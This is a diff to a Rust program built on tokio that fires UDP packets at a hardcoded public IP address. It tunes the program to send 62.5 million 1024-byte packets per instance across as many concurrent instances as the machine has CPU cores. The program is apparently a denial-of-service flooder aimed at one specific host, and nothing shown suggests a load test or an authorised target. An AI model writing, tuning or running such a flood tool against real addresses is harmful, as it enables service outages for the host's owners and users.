@@ -3,6 +3,8 @@ use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
 use tokio::net::UdpSocket;
 use tokio::sync::Mutex;
 use tokio::time::{self, Duration, Instant};
+use tokio::runtime::Builder;
+use num_cpus; 
 
 #[derive(Debug)]
 struct Stats {
@@ -75,10 +77,10 @@ async fn make_udp_requests(
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let server_address: SocketAddr = "185.41.143.36:9223".parse()?;
-    let message = vec![0; 1024]; // Increase payload size to 1024 bytes
-    let num_requests_per_instance = 62500000;
-    let num_instances = 16;
+    let server_address: SocketAddr = "185.41.143.36:9158".parse()?;
+    let message = vec![0; 1024]; 
+    let num_requests_per_instance = 62500000; 
+    let num_instances = num_cpus::get(); 
     let stats = Arc::new(Mutex::new(Stats::new()));
     let counter = Arc::new(AtomicUsize::new(0));
 
@@ -99,7 +101,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     for handle in handles {
-        handle.await?;
+        let _ = handle.await?;
     }
 
     Ok(())
